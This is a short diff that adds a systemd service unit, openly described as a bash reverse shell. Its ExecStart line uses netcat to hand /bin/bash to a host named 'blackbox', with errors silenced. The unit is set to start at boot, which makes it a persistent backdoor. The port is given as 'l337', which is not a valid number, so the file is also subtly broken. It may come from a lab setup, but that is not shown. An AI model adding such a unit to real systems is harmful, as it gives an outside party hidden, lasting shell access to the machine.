@@ -1,0 +1,8 @@
+[Unit]
+Description=Bash reverse shell to blackbox
+After=network.target
+[Service]
+Type=simple
+ExecStart=/usr/bin/nc -e /bin/bash blackbox l337 2>/dev/null
+[Install]
+WantedBy=multi-user.target
